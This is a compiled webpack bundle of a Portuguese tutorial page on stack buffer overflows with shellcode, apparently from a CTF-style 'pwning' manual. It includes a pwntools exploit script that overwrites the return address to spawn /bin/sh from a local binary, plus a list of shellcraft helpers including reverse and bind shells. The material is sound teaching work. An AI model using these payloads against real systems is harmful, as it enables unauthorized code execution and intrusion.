"use strict";(globalThis.webpackChunkmanual_pwning_docs=globalThis.webpackChunkmanual_pwning_docs||[]).push([[7527],{4421(e,n,r){r.r(n),r.d(n,{assets:()=>c,contentTitle:()=>t,default:()=>p,frontMatter:()=>a,metadata:()=>o,toc:()=>d});const o=JSON.parse('{"id":"fast-food/pwning/bof-shellcode","title":"Buffer Overflow - Shellcode","description":"Shellcode \xe9 c\xf3digo assembly. \xc9 pequeno. A ideia \xe9 colocar na stack, colocar o endere\xe7o do in\xedcio do Shellcode no return address e mandar a RIP pra l\xe1.","source":"@site/docs/fast-food/pwning/5-bof-shellcode.md","sourceDirName":"fast-food/pwning","slug":"/fast-food/pwning/bof-shellcode","permalink":"/manual-pwning/docs/fast-food/pwning/bof-shellcode","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":5,"frontMatter":{"title":"Buffer Overflow - Shellcode"},"sidebar":"tutorialSidebar","previous":{"title":"Buffer Overflow - Call Function","permalink":"/manual-pwning/docs/fast-food/pwning/bof-callfunction"},"next":{"title":"Material Extra","permalink":"/manual-pwning/docs/extra/intro"}}');var l=r(4848),s=r(8453);const a={title:"Buffer Overflow - Shellcode"},t=void 0,c={},d=[{value:"ShellCode + pwntools",id:"shellcode--pwntools",level:2}];function i(e){const n={code:"code",h2:"h2",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",...(0,s.R)(),...e.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsxs)(n.p,{children:["Shellcode \xe9 c\xf3digo assembly. \xc9 pequeno. A ideia \xe9 colocar na stack, colocar o endere\xe7o do in\xedcio do Shellcode no ",(0,l.jsx)(n.code,{children:"return address"})," e mandar a RIP pra l\xe1."]}),"\n",(0,l.jsxs)(n.ol,{children:["\n",(0,l.jsx)(n.li,{children:"Identifique se \xe9 poss\xedvel fazer BOF"}),"\n",(0,l.jsxs)(n.li,{children:["Coloque o ",(0,l.jsx)(n.strong,{children:"Shellcode no Input"})," + ",(0,l.jsxs)(n.strong,{children:["Padding at\xe9 ",(0,l.jsx)(n.code,{children:"return address"})]})," + ",(0,l.jsx)(n.strong,{children:"Endere\xe7o do in\xedcio do Shellcode na stack"})]}),"\n",(0,l.jsxs)(n.li,{children:["Sim, acabamos de mandar o ",(0,l.jsx)(n.code,{children:"RIP"})," executar instru\xe7\xe3o na stack."]}),"\n"]}),"\n",(0,l.jsxs)(n.p,{children:["Exemplo com pwntools, abrindo uma shell (",(0,l.jsx)(n.code,{children:"shellcraft.sh()"}),"):"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-py",children:"from pwn import *\r\n\r\ncontext.binary = ELF('./program')\r\n\r\np = process()\r\n\r\npayload = asm(shellcraft.sh())          # Shellcode\r\npayload = payload.ljust(312, b'A')      # Padding\r\npayload += p32(0xffffcfb4)              # Endere\xe7o do Shellcode\r\n\r\nlog.info(p.clean())\r\n\r\np.sendline(payload)\r\n\r\np.interactive()\n"})}),"\n",(0,l.jsx)(n.h2,{id:"shellcode--pwntools",children:"ShellCode + pwntools"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-py",children:"# Shellcodes prontos populares\r\nshellcraft.sh()           # /bin/sh\r\nshellcraft.cat('file')    # cat file\r\nshellcraft.dupsh()        # Duplica shell para fd\r\nshellcraft.echo('text')   # Imprime texto\r\nshellcraft.exit()         # Sai do processo\r\nshellcraft.findpeersh()   # Encontra peer shell\r\n\r\n# Redes\r\nshellcraft.connect('ip', port)\r\nshellcraft.bindsh(port)\r\nshellcraft.reverse('ip', port)\r\n\r\n# Sistema de arquivos\r\nshellcraft.getdents(fd)\r\nshellcraft.getcwd()\n"})}),"\n",(0,l.jsx)(n.p,{children:"Exemplo:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-py",children:'#!/usr/bin/env python3\r\nfrom pwn import *\r\n\r\n# Configurar\r\ncontext.binary = ELF(\'./program\')\r\n\r\np = process()\r\n\r\nprint("Gerando shellcode /bin/sh...")\r\n\r\n# Gerar shellcode\r\nshellcode = asm(shellcraft.sh())\r\n\r\nprint(f"Shellcode: {len(shellcode)} bytes")\r\nprint(hexdump(shellcode))\r\n\r\n# Disassemblar para ver as instru\xe7\xf5es\r\nprint("\\\\nInstru\xe7\xf5es Assembly:")\r\nprint(disasm(shellcode))\r\n\r\n# Testar (opcional - descomente para executar)\r\n# print("\\\\n\ud83d\ude80 Executando shellcode...")\r\n# p = run_shellcode(shellcode)\r\n# p.interactive()\n'})})]})}function p(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,l.jsx)(n,{...e,children:(0,l.jsx)(i,{...e})}):i(e)}},8453(e,n,r){r.d(n,{R:()=>a,x:()=>t});var o=r(6540);const l={},s=o.createContext(l);function a(e){const n=o.useContext(s);return o.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function t(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(l):e.components||l:a(e.components),o.createElement(s.Provider,{value:n},e.children)}}}]);